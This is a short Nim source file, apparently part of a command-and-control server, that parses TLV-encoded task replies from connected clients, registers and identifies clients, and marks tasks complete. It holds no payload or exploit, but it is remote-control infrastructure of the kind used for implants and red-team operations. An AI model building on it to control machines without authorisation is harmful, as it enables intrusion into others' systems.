import std/[
  asyncdispatch, 
  asyncfutures, 
  strformat, 
]

import tlv

import types, logging, communication, events, tasks, clients

proc processMessage*(client: ref C2Client, listenerInstance: ListenerInstance, response: string) {.async.} = 
  let server = client.server

  if not (client[] in server.clients):
    server.clients.add client[]

  client.lastHandledBy = listenerInstance

  let p = initParser()
  p.setBuffer(cast[seq[byte]](response))

  let taskId = p.extractInt32() 
  let taskName = p.extractString()
  let error = p.extractString()
  let data = p.extractString()
  
  if taskId < 0:
    await client[].askToIdentify()
    return

  let task = server.tasks[taskId]
  if error != "":
    errorLog $client[] & ": " & error
    
    if client.server.cli.waitingForOutput:
      client.server.cli.waitingForOutput = false
      prompt(client.server)
  else: 
    case taskName:
    of "identify":
      client[].identify(data)
      if not client.loaded:
        client.loaded = true
        logClientIdentifiction client[]
    of "output":
      infoLog $client[] & " completed task " & task.actionName

    task.output = TaskOutput(
      error: error,
      data: data
    )

    task.markAsCompleted()
